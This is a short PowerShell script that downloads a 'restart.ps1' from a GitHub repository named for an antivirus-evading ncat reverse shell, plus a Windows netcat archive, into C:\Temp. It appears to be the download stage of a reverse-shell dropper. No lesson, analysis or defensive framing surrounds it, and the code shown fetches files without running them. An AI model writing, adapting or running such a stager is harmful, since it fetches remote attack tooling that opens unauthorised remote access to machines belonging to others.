try {
    (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/bjrumplee/ncatreverseshellav/main/restart.ps1', 'C:\Temp\restart.ps1')
} catch {
    Write-Host "Error downloading restart.ps1: $_"
}

try {
    (New-Object System.Net.WebClient).DownloadFile('https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip', 'C:\Temp\netcat.zip')
} catch {
    Write-Host "Error downloading netcat.zip: $_"
}

